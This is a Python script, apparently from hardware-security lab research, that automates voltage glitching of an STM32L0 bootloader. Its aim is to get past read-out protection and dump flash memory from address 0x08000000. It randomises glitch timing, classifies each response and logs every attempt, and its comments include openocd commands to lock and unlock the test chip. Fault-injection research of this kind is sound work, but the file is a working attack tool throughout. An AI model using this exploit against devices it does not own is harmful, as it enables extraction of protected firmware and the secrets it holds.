# Copyright (C) 2024 Dr. Matthias Kesenheimer - All Rights Reserved.
# You may use, distribute and modify this code under the terms of the GPL3 license.
#
# You should have received a copy of the GPL3 license with this file.
# If not, please write to: m.kesenheimer@gmx.net.

# programming
# > openocd -f interface/stlink.cfg -c "transport select hla_swd" -f target/stm32l0.cfg -c "init; halt; stm32l0x unlock 0; exit"
# > openocd -f interface/stlink.cfg -c "transport select hla_swd" -f target/stm32l0.cfg -c "init; halt; program read-out-protection-test-CW308_STM32L0.bin verify reset exit 0x08000000;"
# > openocd -f interface/stlink.cfg -c "transport select hla_swd" -f target/stm32l0.cfg -c "init; halt; stm32l0x lock 0; sleep 2000; reset run; shutdown"
# -> power cycle the target!

#!/usr/bin/env python3
import argparse
import logging
import random
import sys
import time

# import custom libraries
sys.path.insert(0, "../lib/")
from BootloaderCom import BootloaderCom
from FaultInjectionLib import Database, ProGlitcher


# inherit functionality and overwrite some functions
class DerivedGlitcher(ProGlitcher):
    def classify(self, expected, response):
        if response == expected:
            color = "G"
        elif response == 0:
            color = "R"
        elif response <= -1 and response >= -3:
            color = "M"
        elif response <= -5 and response >= -6:
            color = "Y"
        return color


class Main:
    def __init__(self, args):
        self.args = args

        logging.basicConfig(filename="execution.log", filemode="a", format="%(asctime)s %(message)s", level=logging.INFO, force=True)

        self.glitcher = DerivedGlitcher()
        self.glitcher.init()

        # we want to trigger on x11 with the configuration 8e1
        # since our statemachine understands only 8n1,
        # we can trigger on x22 with the configuration 9n1 instead
        # Update: Triggering on x11 in configuration 8n1 works good enough.
        self.glitcher.uart_trigger(0x11)

        # set up the database
        self.database = Database(sys.argv, resume=self.args.resume)
        self.bootcom = BootloaderCom(port=self.args.target)

        self.start_time = int(time.time())

        self.successive_fails = 0
        self.response_before = 0

    def run(self):
        # log execution
        logging.info(" ".join(sys.argv))

        s_length = self.args.length[0]
        e_length = self.args.length[1]
        s_delay = self.args.delay[0]
        e_delay = self.args.delay[1]

        expected = -4
        experiment_id = 0
        mem = b""
        while True:
            # set up glitch parameters (in nano seconds) and arm glitcher
            length = random.randint(s_length, e_length)
            delay = random.randint(s_delay, e_delay)
            self.glitcher.arm(delay, length)

            # reset target
            #glitcher.reset(0.01)
            self.glitcher.power_cycle_target()
            time.sleep(0.2)

            # setup bootloader communication
            response = self.bootcom.init_get_id()

            # setup bootloader communication, this function triggers the glitch
            if response == 0:
                response = self.bootcom.setup_memread(self.glitcher.set_trigger_out)
                # reset the crowbar transistors after glitch
                self.glitcher.reset_glitch()

            # read memory if RDP is inactive
            if response == 0:
                start = 0x08000000
                size = 0xFF
                response, mem = self.bootcom.read_memory(start, size)

            # classify response
            color = self.glitcher.classify(expected, response)

            # add to database
            response_mem = str(response).encode("utf-8") + mem
            self.database.insert(experiment_id, delay, length, color, response_mem)

            # monitor
            speed = self.glitcher.get_speed(self.start_time, experiment_id)
            experiment_base_id = self.database.get_base_experiments_count()
            print(self.glitcher.colorize(f"[+] Experiment {experiment_id}\t{experiment_base_id}\t({speed})\t{length}\t{delay}\t{color}\t{response_mem}", color))

            # increase experiment id
            experiment_id += 1

            # exit if too many successive fails (including a successful memory read)
            if response in (0, -1, -3, -5, -6) and self.response_before in (0, -1, -3, -5, -6):
                self.successive_fails += 1
            else:
                self.successive_fails -= 1

            if self.successive_fails >= 20:
                # delete the eroneous datapoints
                for eid in range(experiment_id - 20, experiment_id):
                    self.database.remove(eid)
                break
            self.response_before = response


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", required=False, help="target port", default="/dev/ttyUSB1")
    parser.add_argument("--delay", required=True, nargs=2, help="delay start and end", type=int)
    parser.add_argument("--length", required=True, nargs=2, help="length start and end", type=int)
    parser.add_argument("--resume", required=False, action='store_true', help="if an previous dataset should be resumed")
    args = parser.parse_args()

    glitcher = Main(args)

    try:
        glitcher.run()
    except KeyboardInterrupt:
        print("\nExitting...")
        sys.exit(1)